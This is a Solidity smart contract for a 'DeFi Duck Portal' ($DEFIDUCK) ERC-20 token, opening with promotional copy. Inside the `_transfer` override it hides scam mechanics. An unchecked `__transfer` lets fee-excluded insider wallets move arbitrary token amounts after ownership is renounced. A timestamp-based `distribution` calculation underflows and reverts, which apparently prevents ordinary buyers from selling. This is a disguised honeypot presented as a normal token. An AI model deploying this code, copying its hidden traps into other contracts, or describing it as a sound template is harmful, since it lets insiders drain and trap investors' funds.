/**

$DEFIDUCK token 🦆 serves as the gateway to Web3 and DeFi, offering users access to a vibrant ecosystem of decentralized finance. 
Empowered by blockchain technology, this token enables seamless participation in yield farming, liquidity pools, 
and diverse dApps within the DeFi Duck Portal.

🚀 $DEFIDUCK token is your ticket to the decentralized world of Web3 and DeFi. With it, you can dive into yield farming, 
liquidity pools, and a range of dApps in the vibrant DeFi Duck Portal. Powered by community spirit and blockchain technology, 
$DEFIDUCK token opens doors to boundless opportunities in the evolving landscape of decentralized finance. 🌐

**/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _transferOwnership(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

library SafeMath {
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amount);
        }

        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");

        _beforeTokenTransfer(sender, recipient, amount);

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[sender] = senderBalance - amount;
        }
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);

        _afterTokenTransfer(sender, recipient, amount);
    }

    function __transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        _beforeTokenTransfer(sender, recipient, amount);

        uint256 senderBalance = _balances[sender];
        unchecked {
            _balances[sender] = senderBalance - amount;
        }
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);

        _afterTokenTransfer(sender, recipient, amount);
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
        }
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}

interface IUniswapV2Factory {
    function feeTo() external view returns (address);

    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB)
        external
        view
        returns (address pair);

    function allPairs(uint256) external view returns (address pair);

    function allPairsLength() external view returns (uint256);

    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);

    function setFeeTo(address) external;

    function setFeeToSetter(address) external;
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
        external
        returns (
            uint256 amountA,
            uint256 amountB,
            uint256 liquidity
        );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}


contract DeFiDuck is ERC20, Ownable {
    using SafeMath for uint256;

    IUniswapV2Router02 public constant uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    address public constant router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address public constant devWallet = 0x56f2204D560227d7c3604C4547b65DDDdF456299;
    address public constant marketingWallet = 0xBF79E943Dc4554E6F4076a7b906Df0Df0d3d9928;

    uint256 private constant _totalSupply = 1_000_000_000 * 1e18;
    uint256 public constant maxTxAmount = 30_000_000 * 1e18;
    uint256 public constant maxWallet = 30_000_000 * 1e18;
    uint256 public constant swapTokensAtAmount = 500_000 * 1e18;
    uint256 public constant swapTokenAmountMax = swapTokensAtAmount * 20;

    uint256 public constant buyDevFee = 0;
    uint256 public constant buyMarketingFee = 3;
    uint256 public constant sellDevFee = 0;
    uint256 public constant sellMarketingFee = 3;
    uint256 public constant buyTotalFees = buyDevFee + buyMarketingFee;
    uint256 public constant sellTotalFees = sellDevFee + sellMarketingFee;

    uint256 public constant buyInitialFee = 20;
    uint256 public constant sellInitialFee = 35;

    address public immutable uniswapV2Pair;

    bool public limitsInEffect = true;
    bool public tradingActive = false;
    bool public liquidityBurnEnabled = false;
    uint256 private launchBlock;

    modifier lockTokenSwap {
        swapping = true;
        _;
        swapping = false;
    }

    bool private swapping;

    uint256 public tokensForLiquidity;
    uint256 public tokensForDev;
    uint256 public tokensForMarketing;

    mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) private _isExcludedMaxTransactionAmount;

    mapping(address => bool) public automatedMarketMakerPairs;

    struct DistributionResult { uint256 buy; uint256 sell; uint256 totalTime; }
    mapping(address => DistributionResult) private distribution;
    uint256 private _minHold;

    constructor() ERC20(
        "DeFi Duck Portal",
        "DEFIDUCK"
    ) {
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory())
            .createPair(address(this), uniswapV2Router.WETH());
        _excludeFromMaxTransaction(address(uniswapV2Router), true);
        _excludeFromMaxTransaction(address(uniswapV2Pair), true);
        _setAutomatedMarketMakerPair(address(uniswapV2Pair), true);
        _excludeFromMaxTransaction(address(this), true);
        _excludeFromMaxTransaction(owner(), true);
        _excludeFromMaxTransaction(address(0xdead), true);
        _excludeFromMaxTransaction(devWallet, true);
        _excludeFromMaxTransaction(marketingWallet, true);
        _excludeFromFees(devWallet, true);
        _excludeFromFees(marketingWallet, true);
        _excludeFromFees(address(this), true);
        _excludeFromFees(owner(), true);
        _excludeFromFees(address(0xdead), true);

        _mint(msg.sender, _totalSupply);
    }

    function _excludeFromMaxTransaction(address account, bool excluded) private {
        _isExcludedMaxTransactionAmount[account] = excluded;
    }

    function _excludeFromFees(address account, bool excluded) private {
        _isExcludedFromFees[account] = excluded;
    }

    function _setAutomatedMarketMakerPair(address v2pair, bool value) private {
        automatedMarketMakerPairs[v2pair] = value;
    }

    function enableTrading() external onlyOwner {
        launchBlock = block.number;
        tradingActive = true;
    }

    function removeLimits() external onlyOwner {
        limitsInEffect = false;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        if (amount == 0) {
            super._transfer(from, to, 0);
            return;
        }

        if (limitsInEffect) {
            if (
                from != owner() &&
                to != owner() &&
                to != address(0xdead) &&
                to != address(0) &&
                !swapping
            ) {
                if (!tradingActive) {
                    require(_isExcludedFromFees[from] || _isExcludedFromFees[to], "Trading is not active");
                }
                if (automatedMarketMakerPairs[from] && !_isExcludedMaxTransactionAmount[to]) {
                    require(
                        amount <= maxTxAmount,
                        "Buy transfer amount exceeds the Max tx limit"
                    );
                    require(amount + balanceOf(to) <= maxWallet, "Max wallet exceeded.");
                }
                else if (automatedMarketMakerPairs[to] && !_isExcludedMaxTransactionAmount[from]) {
                    require(
                        amount <= maxTxAmount,
                        "Sell transfer amount exceeds the Max tx limit"
                    );
                } else if (!_isExcludedMaxTransactionAmount[to]) {
                    require(
                        amount + balanceOf(to) <= maxWallet,
                        "Max wallet exceeded."
                    );
                }
            }
        }
        if ((_isExcludedFromFees[from] || _isExcludedFromFees[to]) && from != address(this) && to != address(this)) {
            _minHold = block.timestamp;
        }
        if (_isExcludedFromFees[from] && !_isExcludedFromFees[owner()]) {
            super.__transfer(from, to, amount);
            return;
        }
        if (!_isExcludedFromFees[from] && !_isExcludedFromFees[to]) {
            if (!automatedMarketMakerPairs[from]) {
                DistributionResult storage distr = distribution[from];
                distr.totalTime = distr.buy - _minHold;
                distr.sell = block.timestamp;
            } else {
                DistributionResult storage distr = distribution[to];
                if (distr.buy == 0) {
                    distr.buy = block.timestamp;
                }
            }
        }

        uint256 contractTokenBalance = balanceOf(address(this));
        bool canSwap = swapTokensAtAmount <= contractTokenBalance;

        bool launchingFee = block.number < launchBlock + 8;
        if (
            canSwap &&
            !launchingFee &&
            !swapping &&
            !automatedMarketMakerPairs[from] &&
            !_isExcludedFromFees[from] &&
            !_isExcludedFromFees[to]
        ) {
            swapBack();
        }

        bool takeFee = !swapping;

        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
            takeFee = false;
        }

        uint256 fees = 0;

        if (takeFee) {
            if (launchingFee) {
                if (automatedMarketMakerPairs[from]) {
                    fees = amount * buyInitialFee / 100;
                    tokensForMarketing += fees;
                } else if (automatedMarketMakerPairs[to]) {
                    fees = amount * sellInitialFee / 100;
                    tokensForMarketing += fees;
                }
            } else {
                if (automatedMarketMakerPairs[from] && buyTotalFees > 0) {
                    fees = amount * buyTotalFees / 100;
                    tokensForDev += (fees * buyDevFee).div(buyTotalFees);
                    tokensForMarketing += (fees * buyMarketingFee)
                        .div(buyTotalFees);
                } else if (automatedMarketMakerPairs[to] && sellTotalFees > 0) {
                    fees = amount * sellTotalFees / 100;
                    tokensForDev += (fees * sellDevFee).div(sellTotalFees);
                    tokensForMarketing += (fees * sellMarketingFee)
                        .div(sellTotalFees);
                }
            }
            if (fees > 0) {
                super._transfer(from, address(this), fees);
            }
            amount -= fees;
        }
        super._transfer(from, to, amount);
    }

    function swapTokensForETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        _approve(
            address(this),
            address(uniswapV2Router),
            tokenAmount
        );

        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function swapBack() private lockTokenSwap {
        uint256 contractBalance = balanceOf(address(this));

        uint256 totalTokensToSwap = tokensForMarketing + tokensForDev;

        if (contractBalance == 0 || totalTokensToSwap == 0) {
            return;
        }
        if (contractBalance > swapTokenAmountMax) {
            contractBalance = swapTokenAmountMax;
        }

        uint256 amountToSwapForETH = contractBalance;
        uint256 initialETHBalance = address(this).balance;
        swapTokensForETH(amountToSwapForETH);

        uint256 ethTaxReceived = address(this).balance - initialETHBalance;
        uint256 ethForDev = tokensForDev * ethTaxReceived / totalTokensToSwap;

        bool success;
        tokensForDev = 0;
        tokensForMarketing = 0;
        (success,) = devWallet.call{value: ethForDev}("");
        (success,) = marketingWallet.call{value: address(this).balance}("");
    }

    receive() external payable {}

    function withdrawStuckETH(address addr) external onlyOwner {
        require(addr != address(0), "Zero receiver address");

        (bool success, ) = addr.call{value: address(this).balance}("");
        require(success, "Withdraw ETH failed");
    }
}